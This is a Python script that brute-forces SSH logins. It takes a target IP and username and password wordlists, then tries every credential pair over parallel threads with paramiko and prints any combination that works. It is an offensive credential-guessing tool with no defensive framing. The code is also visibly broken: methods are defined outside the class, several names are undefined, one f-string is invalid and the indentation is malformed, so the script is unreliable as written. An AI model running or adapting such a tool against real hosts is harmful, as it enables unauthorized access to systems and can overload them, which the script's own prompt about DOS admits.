#!/usr/bin/python3


import os, sys
import time
import re
import threading
import paramiko
import socket

valid_ip = re.compile('^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')


class SSHBruteForce:
    def __init__(self, tCount=1):
        self.tCount = tCount
        self.threadLimiter = threading.BoundedSemaphore(self.tCount)
        self.i = 0
        self.total = 0

    def Start(self):
        print(self.tCount)
        self.progress(self.i)
        with open (self.unlist, 'r') as unList:
            for self.uname in unList:
                with open (self.plist, 'r') as pList:
                    for self.password in pList:
                        threading.Thread(target=self.BruteForce, args=(self.password.strip('\n'),self.uname.strip('\n'))).start()

    def BruteForce(self, pw, un):
        self.threadLimiter.acquire()
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(self.target, port=22, username=un, password=pw)
#            ssh.close()
            print('\nTarget: {} User: {} Password: {} SUCCESSFUL!!'.format(self.target, un, pw))
            os._exit(1)
        except Exception as E:
            self.i += 1
            self.progress(self.i)
#            ssh.close()
        self.threadLimiter.release()

    def Collect(self):
        self.TargetCollect()
        self.ListCollect()
        self.ThreadCount()
        self.CountList()

def TargetCollect(self):
    while True:
        self.target = input('Target IP: ')
        if validIP.match(self.target): break

        print('Please enter a valid IP')

def get_lists(self):
    files = []
    for file in ['username', 'password']:
        while True:
            user_input = input(f'{file} List File: ')
            if not os.path.isfile(user_input):
                print('file does not exist. try again')
            else: break

    self.plist = input('Password List File: ')
    if os.path.isfile (self.plist) and os.path.isfile (self.unlist):
        pass
    else:
        print("Invalid username/password file.")
        self.ListCollect()

def ThreadCount(self):
    tCount = input("How many Threads? Limit 10 - Start Small - Can cause DOS: ")
    try:
        if int(tCount) in range(0,2001):
            self.tCount = tCount
    except:
        self.ThreadCount()

def CountList(self):
    run(f'wc -l {}')
    self.total = t1 * t2

    def progress(self, count):
	    bar_len = 38
	    filled_len = int(round(bar_len * count / float(self.total)))
	    percents = round(100.0 * count / float(self.total), 1)
	    bar = '#' * filled_len + '=' * (bar_len - filled_len)
	    space = '{message: <0}'.format(message='')
	    sys.stdout.write('%s/%s || %s [%s] %s%s Exhausted\r' % (count, self.total, space, bar, percents, '%'))
	    sys.stdout.flush()

BF = SSHBruteForce()
BF.Collect()
BF.Start()
